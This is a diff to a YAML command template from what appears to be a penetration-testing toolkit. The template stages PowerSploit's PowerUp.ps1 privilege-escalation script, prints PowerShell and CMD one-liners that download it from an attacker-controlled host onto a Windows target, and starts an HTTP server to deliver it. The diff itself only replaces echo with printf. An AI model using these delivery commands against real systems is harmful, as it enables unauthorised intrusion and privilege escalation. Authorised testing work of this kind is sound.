@@ -7,11 +7,11 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         -----CMD-----                          '; \
+  printf '%s\n' 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
